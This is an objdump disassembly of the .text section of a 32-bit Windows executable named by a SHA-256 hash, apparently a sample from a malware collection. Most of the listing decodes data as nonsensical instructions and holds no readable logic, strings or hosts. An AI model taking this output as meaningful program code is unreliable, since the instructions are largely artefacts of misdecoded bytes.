
ec73476e15907d3e0b296ba83d6c407e3da8f84bd857e9937712e428493eb845.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    al,bh
  401002:	add    eax,DWORD PTR [eax]
  401004:	hlt    
  401005:	inc    DWORD PTR [ebx+0x0]
  401008:	mov    ebx,0x86507461
  40100d:	imul   esp,DWORD PTR [ebx+0x41],0x58
  401011:	popa   
  401012:	jb     0x401079
  401014:	addr16 jbe 0x401017
  401017:	add    BYTE PTR [eax],dh
  401019:	push   0x61
  40101b:	sub    BYTE PTR fs:[edx+eiz*2+0x72],ch
  401020:	push   ebp
  401021:	ja     0x40109c
  401023:	inc    ebp
  401024:	dec    esp
  401025:	inc    esp
  401026:	add    BYTE PTR [eax],al
  401028:	xor    BYTE PTR [edx+0x61],ch
  40102b:	sub    BYTE PTR fs:[edx+eiz*2+0x72],ch
  401030:	adc    eax,0x2c457977
  401035:	push   edx
  401036:	add    BYTE PTR [eax],al
  401038:	cmp    esp,DWORD PTR [eax+0x74]
  40103b:	dec    ebp
  40103c:	or     esp,DWORD PTR [ecx+0x75]
  40103f:	ins    BYTE PTR es:[edi],dx
  401040:	sbb    DWORD PTR [ebp+0x61],ecx
  401043:	outs   dx,BYTE PTR ds:[esi]
  401044:	adc    BYTE PTR [ecx+0x65],ch
  401047:	inc    ecx
  401048:	hlt    
  401049:	add    al,0x0
  40104b:	add    BYTE PTR [edi],dh
  40104d:	ja     0x4010b4
  40104f:	popa   
  401050:	call   0xd8a956b4
  401055:	pop    edi
  401056:	inc    ecx
  401057:	add    al,dl
  401059:	jne    0x4010cf
  40105b:	jb     0x401034
  40105d:	arpl   WORD PTR [ecx+eax*2-0xc],si
  401061:	add    al,0x0
  401063:	add    BYTE PTR [ebx+0x57745f],dh
	...
  401081:	int    0x6a
  401083:	outs   dx,DWORD PTR fs:[esi]
  401085:	ret    
  401086:	jne    0x4010cc
  401088:	imul   esp,DWORD PTR [esi-0x648b9ca1],0xf4417976
  401092:	add    al,0x0
  401094:	add    BYTE PTR [ebx-0x5cb28ba1],dh
  40109a:	pusha  
  40109b:	jne    0x401109
  40109d:	xchg   ecx,eax
  40109e:	dec    esp
  40109f:	popa   
  4010a0:	outs   dx,BYTE PTR ds:[esi]
  4010a1:	cwde   
  4010a2:	push   0x4f45765
  4010a7:	add    BYTE PTR [eax],al
  4010a9:	clc    
  4010aa:	add    eax,0x6000040
  4010af:	inc    eax
  4010b0:	add    BYTE PTR [eax],bl
  4010b2:	push   es
  4010b3:	inc    eax
  4010b4:	add    BYTE PTR [eax],ah
  4010b6:	push   es
  4010b7:	inc    eax
  4010b8:	add    BYTE PTR [esi+eax*1],bh
  4010bb:	inc    eax
  4010bc:	add    BYTE PTR [eax],ah
  4010be:	push   es
  4010bf:	inc    eax
  4010c0:	add    BYTE PTR [esi+eax*1+0x40],dl
  4010c4:	add    BYTE PTR [esi+eax*1],bh
  4010c7:	inc    eax
  4010c8:	add    BYTE PTR [ebx],bh
  4010ca:	pusha  
  4010cb:	je     0x40111d
  4010cd:	es push 0x63
  4010d0:	inc    ecx
  4010d1:	sbb    BYTE PTR [ecx+0x72],ah
  4010d4:	gs daa 
  4010d6:	jbe    0x4010d8
  4010d8:	add    BYTE PTR [eax+0x6a],al
  4010db:	popa   
  4010dc:	cmp    BYTE PTR fs:[edx+eiz*2+0x72],ch
  4010e1:	adc    eax,0x457977
	...
  4010fe:	cld    
  4010ff:	inc    ebx
  401100:	add    BYTE PTR [eax],al
  401102:	fistp  WORD PTR [edi+0x72]
  401105:	outs   dx,BYTE PTR ds:[esi]
  401106:	shr    DWORD PTR [eax+0x33],1
  401109:	xor    dl,BYTE PTR [edx]
  40110b:	popa   
  40110c:	ins    BYTE PTR es:[edi],dx
  40110d:	ins    BYTE PTR es:[edi],dx
  40110e:	hlt    
  40110f:	add    al,0x0
  401111:	add    cl,ah
  401113:	jne    0x40118b
  401115:	arpl   si,ax
  401117:	jo     0x401147
  401119:	shr    BYTE PTR fs:[eax+0x0],1
  40111d:	add    cl,cl
  40111f:	pop    edi
  401120:	ins    DWORD PTR es:[edi],dx
  401121:	jae    0x4010bc
  401123:	jo     0x401125
  401125:	add    BYTE PTR [ecx-0x599c898b],bl
  40112b:	jo     0x40115b
  40112d:	mov    BYTE PTR fs:[eax+0x0],ch
  401131:	add    BYTE PTR [ecx-0x7b9c92a1],ah
  401137:	jnp    0x401139
  401139:	add    BYTE PTR [edx-0x7e8b8d95],ch
  40113f:	arpl   WORD PTR [ecx+eax*2+0x60],bp
  401143:	imul   ebp,DWORD PTR [edi+0x63],0x4f4
  40114a:	dec    edx
  40114b:	outs   dx,BYTE PTR ds:[esi]
  40114c:	jb     0x4011c2
  40114e:	popa   
  40114f:	data16 ins BYTE PTR es:[edi],dx
  401151:	inc    ecx
  401152:	pusha  
  401153:	imul   ebp,DWORD PTR [edi+0x63],0x4f4
  40115a:	sub    DWORD PTR [edi+0x6d],esp
  40115d:	popa   
  40115e:	inc    esp
  40115f:	dec    edi
  401160:	imul   esp,DWORD PTR [ebp+0x0],0x0
	...
  40117b:	sub    ecx,DWORD PTR [eax+0x66]
  40117e:	inc    esi
  40117f:	sbb    eax,0x4a006569
  401184:	outs   dx,BYTE PTR ds:[esi]
  401185:	jb     0x4011fb
  401187:	and    DWORD PTR [esi+0x6c],esp
  40118a:	push   eax
  40118b:	push   es
  40118c:	push   0x71176574
  401191:	add    BYTE PTR [eax],al
  401193:	sub    al,0x62
  401195:	popa   
  401196:	jo     0x4011cd
  401198:	imul   ebp,DWORD PTR [edi+ebp*2-0x29],0xdf000004
  4011a0:	popa   
  4011a1:	jb     0x401211
  4011a3:	fldcw  WORD PTR [eax+0x33]
  4011a6:	xor    cl,BYTE PTR [edx]
  4011a8:	popa   
  4011a9:	ins    BYTE PTR es:[edi],dx
  4011aa:	ins    BYTE PTR es:[edi],dx
  4011ab:	hlt    
  4011ac:	add    al,0x0
  4011ae:	add    BYTE PTR [ebx-0x39af8b9f],dh
  4011b4:	arpl   WORD PTR [di-0x39],sp
  4011b8:	jae    0x401202
  4011ba:	gs xchg ebp,eax
  4011bc:	je     0x4011be
  4011be:	add    ah,dh
  4011c0:	add    al,0xe2
  4011c2:	add    esi,esp
  4011c4:	mov    al,ds:0xedf40059
  4011c9:	add    eax,DWORD PTR [eax]
  4011cb:	hlt    
  4011cc:	in     eax,dx
  4011cd:	add    eax,DWORD PTR [eax]
  4011cf:	hlt    
  4011d0:	in     eax,dx
  4011d1:	add    eax,DWORD PTR [eax]
  4011d3:	hlt    
  4011d4:	in     eax,dx
  4011d5:	add    eax,DWORD PTR [eax]
  4011d7:	hlt    
  4011d8:	in     eax,dx
  4011d9:	add    eax,DWORD PTR [eax]
  4011db:	hlt    
  4011dc:	in     eax,dx
  4011dd:	add    eax,DWORD PTR [eax]
	...
  4011f7:	add    ah,dh
  4011f9:	in     eax,dx
  4011fa:	add    eax,DWORD PTR [eax]
  4011fc:	hlt    
  4011fd:	in     eax,dx
  4011fe:	add    eax,DWORD PTR [eax]
  401200:	hlt    
  401201:	in     eax,dx
  401202:	add    eax,DWORD PTR [eax]
  401204:	hlt    
  401205:	in     eax,dx
  401206:	add    eax,DWORD PTR [eax]
  401208:	hlt    
  401209:	in     eax,dx
  40120a:	add    eax,DWORD PTR [eax]
  40120c:	hlt    
  40120d:	in     eax,dx
  40120e:	add    eax,DWORD PTR [eax]
  401210:	hlt    
  401211:	in     eax,dx
  401212:	add    eax,DWORD PTR [eax]
  401214:	hlt    
  401215:	in     eax,dx
  401216:	add    eax,DWORD PTR [eax]
  401218:	hlt    
  401219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40121a:	add    al,0x0
  40121c:	hlt    
  40121d:	in     eax,dx
  40121e:	add    eax,DWORD PTR [eax]
  401220:	hlt    
  401221:	in     eax,dx
  401222:	add    eax,DWORD PTR [eax]
  401224:	hlt    
  401225:	in     eax,dx
  401226:	add    eax,DWORD PTR [eax]
  401228:	hlt    
  401229:	in     eax,dx
  40122a:	add    eax,DWORD PTR [eax]
  40122c:	hlt    
  40122d:	in     eax,dx
  40122e:	add    eax,DWORD PTR [eax]
  401230:	hlt    
  401231:	in     eax,dx
  401232:	add    eax,DWORD PTR [eax]
  401234:	hlt    
  401235:	in     eax,dx
  401236:	add    eax,DWORD PTR [eax]
  401238:	hlt    
  401239:	in     eax,dx
  40123a:	add    eax,DWORD PTR [eax]
  40123c:	hlt    
  40123d:	in     eax,dx
  40123e:	add    eax,DWORD PTR [eax]
  401240:	hlt    
  401241:	in     eax,dx
  401242:	add    eax,DWORD PTR [eax]
  401244:	hlt    
  401245:	in     eax,dx
  401246:	add    eax,DWORD PTR [eax]
  401248:	hlt    
  401249:	in     eax,dx
  40124a:	add    eax,DWORD PTR [eax]
  40124c:	hlt    
  40124d:	in     eax,dx
  40124e:	add    eax,DWORD PTR [eax]
  401250:	hlt    
  401251:	in     eax,dx
  401252:	add    eax,DWORD PTR [eax]
  401254:	hlt    
  401255:	add    al,0xe9
  401257:	add    esi,esp
  401259:	add    al,0xe9
  40125b:	add    eax,DWORD PTR [eax]
	...
  401275:	hlt    
  401276:	add    al,0xe9
  401278:	add    esi,esp
  40127a:	add    al,0xe9
  40127c:	add    esi,esp
  40127e:	add    al,0xe9
  401280:	add    esi,esp
  401282:	add    al,0xe9
  401284:	add    esi,esp
  401286:	add    al,0xe9
  401288:	add    esi,esp
  40128a:	add    al,0xe9
  40128c:	add    esi,esp
  40128e:	add    al,0xe9
  401290:	add    esi,esp
  401292:	add    al,0xe9
  401294:	add    esi,esp
  401296:	add    al,0xe9
  401298:	add    esi,esp
  40129a:	add    al,0xe9
  40129c:	add    esi,esp
  40129e:	add    al,0xe9
  4012a0:	add    esi,esp
  4012a2:	add    al,0xe9
  4012a4:	add    esi,esp
  4012a6:	add    al,0xe9
  4012a8:	add    esi,esp
  4012aa:	add    al,0xe9
  4012ac:	add    esi,esp
  4012ae:	add    al,0xe9
  4012b0:	add    esi,esp
  4012b2:	add    al,0xe9
  4012b4:	add    esi,esp
  4012b6:	add    al,0xe9
  4012b8:	add    esi,esp
  4012ba:	add    al,0xe9
  4012bc:	add    esi,esp
  4012be:	add    al,0xe9
  4012c0:	add    esi,esp
  4012c2:	add    al,0xe9
  4012c4:	add    esi,esp
  4012c6:	add    al,0xe9
  4012c8:	add    esi,esp
  4012ca:	add    al,0xe9
  4012cc:	add    esi,esp
  4012ce:	add    al,0xe9
  4012d0:	add    esi,esp
  4012d2:	add    al,0xe9
  4012d4:	add    esi,esp
  4012d6:	add    al,0xe9
  4012d8:	add    eax,DWORD PTR [eax]
	...
  4012f2:	hlt    
  4012f3:	add    al,0xe9
  4012f5:	add    esi,esp
  4012f7:	add    al,0xe9
  4012f9:	add    esi,esp
  4012fb:	add    al,0xe9
  4012fd:	add    esi,esp
  4012ff:	add    al,0x0
  401301:	jmp    0xe94017fd
  401306:	test   DWORD PTR [eax+eax*1],0x4b4b9
  40130d:	lods   eax,DWORD PTR ds:[esi]
  40130e:	clc    
  40130f:	add    DWORD PTR [eax],eax
  401311:	shr    DWORD PTR [ebp-0x76],cl
  401314:	dec    edi
  401315:	jmp    0xe9401811
  40131a:	test   DWORD PTR [eax+eax*1],0x102f709
  401321:	loop   0x401313
  401323:	or     al,BYTE PTR [eax]
  401325:	jmp    0xe94014cb
  40132a:	inc    edi
  40132b:	add    eax,0x4f7e900
  401330:	add    BYTE PTR [ecx-0x16fffd1f],dl
  401336:	out    0x4,eax
  401338:	add    cl,ch
  40133a:	mov    bh,0x1
  40133c:	add    cl,ch
  40133e:	test   DWORD PTR [eax+eax*1-0x17],0xe90004e7
  401346:	stc    
  401347:	add    al,0x0
  401349:	in     al,dx
  40134a:	test   DWORD PTR [ebx],0x4f7e800
  401350:	add    ah,ch
  401352:	test   DWORD PTR [ebx],0xe900
	...
  40136c:	add    BYTE PTR [eax],al
  40136e:	add    bh,dh
  401370:	add    al,0x0
  401372:	jmp    0xe940144e
  401377:	xor    ebp,0xffffffff
  40137a:	jmp    0xeb401876
  40137f:	test   DWORD PTR [ecx+eax*4],0x14f7e9
  401386:	jmp    0xe9401892
  40138b:	not    DWORD PTR [eax+eax*1]
  40138e:	jmp    0x40187a
  401393:	pop    ebp
  401394:	add    DWORD PTR [eax],eax
  401396:	add    BYTE PTR ds:0x4d000001,bl
  40139c:	add    DWORD PTR [eax],eax
  40139e:	add    BYTE PTR ds:0x59000001,bl
  4013a4:	test   DWORD PTR [ebx],eax
  4013a6:	add    BYTE PTR [ebp+0x2],cl
  4013a9:	add    BYTE PTR [eax],al
  4013ab:	or     eax,0x1d000001
  4013b0:	add    DWORD PTR [eax],eax
  4013b2:	add    BYTE PTR ds:0xd000001,bl
  4013b8:	add    DWORD PTR [eax],eax
  4013ba:	add    BYTE PTR ds:0xdd000001,cl
  4013c0:	or     BYTE PTR [eax],al
  4013c2:	add    ch,bl
  4013c4:	clc    
  4013c5:	add    eax,DWORD PTR [eax]
  4013c7:	ins    DWORD PTR es:[edi],dx
  4013c8:	push   cs
  4013c9:	add    BYTE PTR [eax],al
  4013cb:	int    0x8
  4013cd:	add    BYTE PTR [eax],al
  4013cf:	fisttp QWORD PTR [eax]
	...
  4013e9:	add    BYTE PTR [eax],al
  4013eb:	add    ch,bl
  4013ed:	or     BYTE PTR [eax],al
  4013ef:	add    ch,cl
  4013f1:	or     BYTE PTR [eax],al
  4013f3:	add    ch,cl
  4013f5:	or     BYTE PTR [eax],al
  4013f7:	add    BYTE PTR [ebp-0x62fffff8],bl
  4013fd:	or     BYTE PTR [eax],al
  4013ff:	add    BYTE PTR [ebp-0x72fffff8],cl
  401405:	or     BYTE PTR [eax],al
  401407:	add    BYTE PTR [ebp-0x62fffff8],bl
  40140d:	or     BYTE PTR [eax],al
  40140f:	add    BYTE PTR [ebp-0x72fffff8],cl
  401415:	sbb    BYTE PTR [eax],al
  401417:	add    BYTE PTR ds:0x5d000006,ch
  40141d:	or     BYTE PTR [eax],al
  40141f:	add    BYTE PTR [ebp+0x8],cl
  401422:	add    BYTE PTR [eax],al
  401424:	hlt    
  401425:	fld    QWORD PTR [ebx]
  401427:	add    ah,dh
  401429:	fld    QWORD PTR [ebx]
  40142b:	add    ah,dh
  40142d:	fld    QWORD PTR [ebx]
  40142f:	add    ah,dh
  401431:	fld    QWORD PTR [ebx]
  401433:	add    ah,dh
  401435:	or     esi,DWORD PTR [eax+0x65]
  401438:	lods   al,BYTE PTR ds:[esi]
  401439:	mov    ecx,0x43f40003
  40143e:	stos   DWORD PTR es:[edi],eax
  40143f:	add    esi,esp
  401441:	fst    QWORD PTR [ebx]
  401443:	add    ah,dh
  401445:	(bad)  [ebp-0x220bfd]
  40144b:	dec    DWORD PTR [ebx]
  40144d:	fiadd  WORD PTR [ebx]
	...
  401467:	add    BYTE PTR [eax],al
  401469:	hlt    
  40146a:	fld    QWORD PTR [ebx]
  40146c:	add    ah,dh
  40146e:	fld    QWORD PTR [ebx]
  401470:	add    ah,dh
  401472:	mov    ebp,0x1c540003
  401477:	pusha  
  401478:	popa   
  401479:	push   0xf400043d
  40147e:	cmp    eax,0xddf40021
  401483:	ret    
  401484:	add    esi,esp
  401486:	fisttp QWORD PTR [ebx]
  401488:	add    ah,dh
  40148a:	frstor [ebp+0x3ddf403]
  401490:	add    ah,dh
  401492:	fld    QWORD PTR [ebx]
  401494:	add    ah,dh
  401496:	fld    QWORD PTR [ebx]
  401498:	add    ah,dh
  40149a:	sbb    eax,0xcbb40004
  40149f:	jno    0x401506
  4014a1:	and    bl,dh
  4014a3:	bound  eax,QWORD PTR [eax]
  4014a5:	hlt    
  4014a6:	cdq    
  4014a7:	sub    al,0x0
  4014a9:	hlt    
  4014aa:	(bad)  
  4014ac:	add    esi,esp
  4014ae:	(bad)  [ecx]
  4014b0:	add    ah,dh
  4014b2:	(bad)  [ebp-0x16fb0bfd]
  4014b8:	add    esi,esp
  4014ba:	add    al,0xe9
  4014bc:	add    esi,esp
  4014be:	add    al,0xe9
  4014c0:	add    esi,esp
  4014c2:	add    al,0xa9
  4014c4:	add    esi,esp
  4014c6:	inc    esi
  4014c7:	jmp    0xe94508cf
  4014cc:	add    eax,DWORD PTR [eax]
	...
  4014e6:	hlt    
  4014e7:	add    al,0xe9
  4014e9:	add    esi,esp
  4014eb:	add    al,0xe9
  4014ed:	add    esi,esp
  4014ef:	add    al,0xe9
  4014f1:	add    esi,esp
  4014f3:	add    al,0xe9
  4014f5:	add    esi,esp
  4014f7:	add    al,0xe9
  4014f9:	add    esi,esp
  4014fb:	add    al,0xe9
  4014fd:	add    esi,esp
  4014ff:	add    al,0xe9
  401501:	add    esi,esp
  401503:	add    al,0xe9
  401505:	add    esi,esp
  401507:	add    al,0xe9
  401509:	add    esi,esp
  40150b:	add    al,0xe9
  40150d:	add    esi,esp
  40150f:	add    al,0xe9
  401511:	add    esi,esp
  401513:	add    al,0xe9
  401515:	add    esi,esp
  401517:	add    al,0xe9
  401519:	add    esi,esp
  40151b:	add    al,0xe9
  40151d:	add    esi,esp
  40151f:	add    al,0xe9
  401521:	add    esi,esp
  401523:	add    al,0xe9
  401525:	add    esi,esp
  401527:	add    al,0xe9
  401529:	add    esi,esp
  40152b:	add    al,0xe9
  40152d:	add    esi,esp
  40152f:	add    al,0xe9
  401531:	add    esi,esp
  401533:	add    al,0xe9
  401535:	add    esi,esp
  401537:	add    al,0xe9
  401539:	add    esi,esp
  40153b:	add    al,0xe9
  40153d:	add    esi,esp
  40153f:	add    al,0xe9
  401541:	add    esi,esp
  401543:	add    al,0xe9
  401545:	add    esi,esp
  401547:	add    al,0x0
  401549:	jmp    0x40154e
	...
  401562:	add    bh,dh
  401564:	add    al,0x0
  401566:	jmp    0xe9401a62
  40156b:	test   DWORD PTR [eax+eax*1],0x4f7e9
  401572:	jmp    0xe9401a6e
  401577:	test   DWORD PTR [eax+eax*1],0x4f7e9
  40157e:	jmp    0xe9401a7a
  401583:	test   DWORD PTR [eax+eax*1],0x4f7e9
  40158a:	jmp    0xe9401a86
  40158f:	test   DWORD PTR [eax+eax*1],0x4f7e9
  401596:	jmp    0xe9401a92
  40159b:	test   DWORD PTR [eax+eax*1],0x4f7e9
  4015a2:	jmp    0xe9401a9e
  4015a7:	test   DWORD PTR [eax+eax*1],0x4f7e9
  4015ae:	jmp    0xe9401aaa
  4015b3:	test   DWORD PTR [eax+eax*1],0x4f7e9
  4015ba:	jmp    0xe9401ab6
  4015bf:	test   DWORD PTR [eax+eax*1],0x4f7e9
  4015c6:	jmp    0x4015cb
	...
  4015df:	add    bh,dh
  4015e1:	add    al,0x0
  4015e3:	jmp    0xe9401adf
  4015e8:	test   DWORD PTR [eax+eax*1],0x4f7e9
  4015ef:	jmp    0x401aeb
  4015f4:	lea    eax,ds:0x58d0000
  4015fa:	add    BYTE PTR [eax],al
  4015fc:	pop    ebp
  4015fd:	add    eax,0x55d0000
  401602:	add    BYTE PTR [eax],al
  401604:	dec    ebp
  401605:	add    eax,0x54d0000
  40160a:	add    BYTE PTR [eax],al
  40160c:	pop    ebp
  40160d:	add    eax,0x55d0000
  401612:	add    BYTE PTR [eax],al
  401614:	dec    ebp
  401615:	add    eax,0x54d0000
  40161a:	add    BYTE PTR [eax],al
  40161c:	sbb    eax,0x1d000005
  401621:	add    eax,0x50d0000
  401626:	add    BYTE PTR [eax],al
  401628:	or     eax,0x1d000005
  40162d:	add    eax,0x51d0000
  401632:	add    BYTE PTR [eax],al
  401634:	or     eax,0xd000005
  401639:	add    eax,0x4dd0000
  40163e:	add    BYTE PTR [eax],al
  401640:	fld    QWORD PTR [eax+eax*1]
	...
  40165b:	add    BYTE PTR [eax],al
  40165d:	int    0x4
  40165f:	add    BYTE PTR [eax],al
  401661:	int    0x4
  401663:	add    BYTE PTR [eax],al
  401665:	fld    QWORD PTR [eax+eax*1]
  401668:	add    ch,bl
  40166a:	add    al,0x0
  40166c:	add    ch,cl
  40166e:	add    al,0x0
  401670:	add    ch,cl
  401672:	add    al,0x0
  401674:	add    BYTE PTR [ebp-0x62fffffc],bl
  40167a:	add    al,0x0
  40167c:	add    BYTE PTR [ebp-0x72fffffc],cl
  401682:	add    al,0x0
  401684:	add    ah,dh
  401686:	fld    QWORD PTR [ebx]
  401688:	add    ah,dh
  40168a:	fld    QWORD PTR [ebx]
  40168c:	add    ah,dh
  40168e:	fld    QWORD PTR [ebx]
  401690:	add    ah,dh
  401692:	fld    QWORD PTR [ebx]
  401694:	add    ah,dh
  401696:	fld    QWORD PTR [ebx]
  401698:	add    ah,dh
  40169a:	fld    QWORD PTR [ebx]
  40169c:	add    ah,dh
  40169e:	fld    QWORD PTR [ebx]
  4016a0:	add    ah,dh
  4016a2:	fld    QWORD PTR [ebx]
  4016a4:	add    ah,dh
  4016a6:	fld    QWORD PTR [ebx]
  4016a8:	add    ah,dh
  4016aa:	fld    QWORD PTR [ebx]
  4016ac:	add    ah,dh
  4016ae:	fld    QWORD PTR [ebx]
  4016b0:	add    ah,dh
  4016b2:	fld    QWORD PTR [ebx]
  4016b4:	add    ah,dh
  4016b6:	fld    QWORD PTR [ebx]
  4016b8:	add    ah,dh
  4016ba:	fld    QWORD PTR [ebx]
  4016bc:	add    ah,dh
  4016be:	fld    QWORD PTR [ebx]
	...
  4016d8:	add    BYTE PTR [eax],al
  4016da:	hlt    
  4016db:	fld    QWORD PTR [ebx]
  4016dd:	add    ah,dh
  4016df:	add    esp,DWORD PTR [edi-0x58c00bfd]
  4016e5:	add    esi,esp
  4016e7:	xstore-rng (bad)
  4016e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e9:	add    esi,esp
  4016eb:	icebp  
  4016ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ed:	add    esi,esp
  4016ef:	out    0xa6,eax
  4016f1:	add    esi,esp
  4016f3:	mov    ebx,0x17f403a6
  4016f8:	mov    eax,ds:0xa11df403
  4016fd:	add    esi,esp
  4016ff:	daa    
  401700:	mov    eax,ds:0xa149f403
  401705:	add    esi,esp
  401707:	popa   
  401708:	mov    eax,ds:0xa17df403
  40170d:	add    esi,esp
  40170f:	xchg   ebp,eax
  401710:	mov    eax,ds:0xa1b9f403
  401715:	add    esi,esp
  401717:	add    al,0xf9
  401719:	mov    eax,ds:0xa1c504f7
  40171e:	test   DWORD PTR [ebx*8+0x2704f7a1],0x1f04f7a2
  401729:	mov    ds:0xa21304f7,al
  40172e:	test   DWORD PTR [ecx+ebp*2],0x5b04f7a2
  401735:	mov    ds:0xa29504f7,al
  40173a:	test   DWORD PTR [eiz*1+0xa2],0x0
	...
  401755:	add    BYTE PTR [eax],al
  401757:	test   DWORD PTR [esi*1+0x5504f7a2],0xd904f7a2
  401762:	mov    ds:0xa30504f7,al
  401767:	test   DWORD PTR [esi*8-0x64fb085e],0x8d04f7a2
  401772:	mov    ds:0xa29504f7,al
  401777:	test   DWORD PTR [edi+ebp*2],0xe904f7a3
  40177e:	add    esi,esp
  401780:	add    al,0x2d
  401782:	mov    eax,0xb84b04f7
  401787:	test   DWORD PTR [ebp*2+0x7f04f7b8],0x4504f7b7
  401792:	mov    eax,0xb82504f7
  401797:	test   DWORD PTR [ebx+ecx*1],0xad04f7b8
  40179e:	mov    bh,0xf7
  4017a0:	add    al,0xe9
  4017a2:	add    esi,esp
  4017a4:	add    al,0x17
  4017a6:	mov    bh,0xf7
  4017a8:	add    al,0x0
  4017aa:	cdq    
  4017ab:	popa   
  4017ac:	add    al,BYTE PTR [eax]
  4017ae:	sub    ebp,DWORD PTR [ebx+0x2]
  4017b1:	add    BYTE PTR [ebp+0x61],ah
  4017b4:	add    al,BYTE PTR [eax]
  4017b6:	pop    ecx
  4017b7:	dec    ecx
  4017b8:	add    al,BYTE PTR [eax]
  4017ba:	fild   WORD PTR [eax]
	...
  4017d4:	inc    edx
  4017d5:	add    al,BYTE PTR [eax]
  4017d7:	ret    
  4017d8:	dec    edx
  4017d9:	add    al,BYTE PTR [eax]
  4017db:	in     eax,0x42
  4017dd:	add    al,BYTE PTR [eax]
  4017df:	out    0xaa,eax
  4017e1:	add    al,BYTE PTR [eax]
  4017e3:	jne    0x401786
  4017e5:	add    al,BYTE PTR [eax]
  4017e7:	jns    0x401792
  4017e9:	add    al,BYTE PTR [eax]
  4017eb:	dec    ecx
  4017ec:	mov    eax,ds:0x89890002
  4017f1:	add    al,BYTE PTR [eax]
  4017f3:	retf   
  4017f4:	add    BYTE PTR [edx],0x0
  4017f7:	mov    DWORD PTR [bp+si],eax
  4017fa:	add    cl,ch
  4017fc:	test   DWORD PTR [eax+eax*1],0x26eaf
  401803:	jmp    0x9b401cff
  401808:	pop    eax
  401809:	add    al,BYTE PTR [eax]
  40180b:	mov    edx,DWORD PTR [eax+0x2]
  40180e:	add    BYTE PTR [ebp+0x67000258],dl
  401814:	push   eax
  401815:	add    al,BYTE PTR [eax]
  401817:	inc    ebp
  401818:	pop    eax
  401819:	add    al,BYTE PTR [eax]
  40181b:	inc    ebp
  40181c:	push   eax
  40181d:	add    al,BYTE PTR [eax]
  40181f:	xor    DWORD PTR [eax-0x6ffaffff],ebx
  401825:	add    DWORD PTR [eax],eax
  401827:	jmp    0xf74019c5
  40182c:	xchg   ecx,eax
  40182d:	add    DWORD PTR [eax],eax
  40182f:	pop    es
  401830:	call   0x1:0x92170001
  401837:	xor    eax,DWORD PTR [eax]
	...
  401851:	call   0x3a7:0x2b000001
  401858:	add    bh,ch
  40185a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40185b:	add    eax,DWORD PTR [eax]
  40185d:	sbb    eax,0x430003a7
  401862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401863:	add    eax,DWORD PTR [eax]
  401865:	jae    0x40180d
  401867:	add    eax,DWORD PTR [eax]
  401869:	adc    eax,0x530003a7
  40186e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40186f:	add    eax,DWORD PTR [eax]
  401871:	push   ecx
  401872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401873:	add    eax,DWORD PTR [eax]
  401875:	arpl   WORD PTR [esi-0x57a2fffd],sp
  40187b:	add    eax,DWORD PTR [eax]
  40187d:	inc    ecx
  40187e:	test   al,0x3
  401880:	add    BYTE PTR [ebp-0x62fffc58],ah
  401886:	test   al,0x3
  401888:	add    BYTE PTR [edi],ah
  40188a:	test   al,0x3
  40188c:	add    cl,bl
  40188e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40188f:	add    eax,DWORD PTR [eax]
  401891:	leave  
  401892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401893:	add    eax,DWORD PTR [eax]
  401895:	imul   esp,DWORD PTR [edi-0x5888fffd],0xa80f0003
  40189f:	add    eax,DWORD PTR [eax]
  4018a1:	lods   eax,DWORD PTR ds:[esi]
  4018a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018a3:	add    eax,DWORD PTR [eax]
  4018a5:	std    
  4018a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018a7:	add    eax,DWORD PTR [eax]
  4018a9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018ab:	add    eax,DWORD PTR [eax]
  4018ad:	adc    DWORD PTR [ebp-0x5ad2fffd],esp
  4018b3:	add    eax,DWORD PTR [eax]
	...
  4018cd:	add    BYTE PTR [ebx],dh
  4018cf:	mov    ds:0x97110003,al
  4018d4:	add    eax,DWORD PTR [eax]
  4018d6:	mov    DWORD PTR [ebx+eax*1+0x3a46300],esp
  4018dd:	add    BYTE PTR [ecx-0x5c],cl
  4018e0:	add    eax,DWORD PTR [eax]
  4018e2:	dec    ebp
  4018e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018e4:	add    eax,DWORD PTR [eax]
  4018e6:	hlt    
  4018e7:	jae    0x401890
  4018e9:	add    esi,esp
  4018eb:	lea    esp,[edi-0x58660bfd]
  4018f1:	add    esi,esp
  4018f3:	lea    esp,[edi-0x58420bfd]
  4018f9:	add    esi,esp
  4018fb:	scas   eax,DWORD PTR es:[edi]
  4018fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018fd:	add    esi,esp
  4018ff:	(bad)  [esi-0x58f80bfd]
  401905:	add    esi,esp
  401907:	iret   
  401908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401909:	add    esi,esp
  40190b:	or     DWORD PTR [edi-0x58de0bfd],esp
  401911:	add    esi,esp
  401913:	adc    eax,0xeff403a7
  401918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401919:	add    esi,esp
  40191b:	pop    ebp
  40191c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40191d:	add    esi,esp
  40191f:	ins    DWORD PTR es:[edi],dx
  401920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401921:	add    esi,esp
  401923:	and    DWORD PTR [esi-0x59760bfd],0xa625f403
  40192d:	add    esi,esp
  40192f:	or     esp,DWORD PTR [esi+0x3]
	...
  401949:	add    BYTE PTR [eax],al
  40194b:	hlt    
  40194c:	mov    cl,0xab
  40194e:	add    esi,esp
  401950:	xchg   ebp,eax
  401951:	stos   DWORD PTR es:[edi],eax
  401952:	add    esi,esp
  401954:	mov    eax,ds:0xe5f403ab
  401959:	stos   DWORD PTR es:[edi],eax
  40195a:	add    esi,esp
  40195c:	mov    edi,0xedf403ab
  401961:	stos   DWORD PTR es:[edi],eax
  401962:	add    esi,esp
  401964:	mul    DWORD PTR [edx-0x5d280bfd]
  40196a:	add    esi,esp
